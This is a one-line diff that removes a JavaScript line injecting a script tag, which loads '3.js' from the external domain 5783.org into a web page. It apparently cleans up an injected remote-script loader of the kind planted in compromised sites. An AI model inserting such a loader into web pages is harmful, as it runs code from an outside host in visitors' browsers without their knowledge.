@@ -1,1 +1,0 @@
-document.writeln("<script type=\'text/javascript\' src=\'//5783.org/zmmx5418/3.js\'></script>");
